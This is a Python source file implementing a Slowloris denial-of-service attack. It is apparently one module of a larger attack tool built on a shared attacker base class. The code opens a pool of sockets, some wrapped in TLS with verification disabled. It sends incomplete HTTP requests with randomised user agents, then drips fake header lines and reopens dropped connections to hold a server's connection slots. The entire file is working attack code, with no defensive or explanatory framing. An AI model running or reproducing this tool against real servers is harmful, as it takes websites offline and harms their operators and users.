import socket
import random
import time
import ssl

from .base import BaseAttacker

class SlowlorisAttack(BaseAttacker):
    def __init__(self, args, config, stats, running, worker_id):
        super().__init__(args, config, stats, running, worker_id)
        self.slow_config = config.get('slowloris', {})
        self.sockets = []

    def _build_partial(self):
        ua = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ])
        return (f"GET /{random.randint(100000, 999999)} HTTP/1.1\r\n"
                f"Host: {self.target}\r\nUser-Agent: {ua}\r\n").encode()

    def _create_socket(self):
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.settimeout(self.slow_config.get('timeout', 5))
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                return context.wrap_socket(raw, server_hostname=self.target)
            return raw
        except Exception:
            return None

    def _open_and_hold(self, index):
        """Replace the socket at `index` (or append if index is None).
        Returns True on success."""
        sock = self._create_socket()
        if not sock:
            return False
        try:
            sock.connect((self.target, self.port))
            sock.send(self._build_partial())
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return False
        if index is None:
            self.sockets.append(sock)
        else:
            self.sockets[index] = sock
        self._count(sent=1)
        return True

    def attack(self):
        sockets_per = self.slow_config.get('sockets_per_thread', 150)
        sleep_interval = self.slow_config.get('sleep_interval', 15)
        retry_backoff = self.slow_config.get('retry_backoff', 2)

        try:
            # Phase 1: open initial pool (replace-in-place list)
            self.sockets = [None] * sockets_per
            for i in range(sockets_per):
                if not self.running.value:
                    break
                self._open_and_hold(i)
                self._pace()

            # Phase 2: keep connections alive with partial headers
            while self.running.value:
                dead = []
                for i, sock in enumerate(self.sockets):
                    if not self.running.value:
                        break
                    if sock is None:
                        dead.append(i)
                        continue
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self._count(sent=1)
                    except Exception:
                        dead.append(i)
                        try:
                            sock.close()
                        except Exception:
                            pass

                # Retry dead slots with backoff so we don't hammer a
                # rejecting server in a tight loop
                if dead and self.running.value:
                    time.sleep(retry_backoff)
                    for i in dead:
                        if not self.running.value:
                            break
                        self._open_and_hold(i)

                self._flush()
                # Sleep in short ticks so Ctrl+C / stop() responds quickly
                slept = 0.0
                while slept < sleep_interval and self.running.value:
                    time.sleep(0.5)
                    slept += 0.5
        finally:
            for sock in self.sockets:
                try:
                    sock.close()
                except Exception:
                    pass
            self.finalize()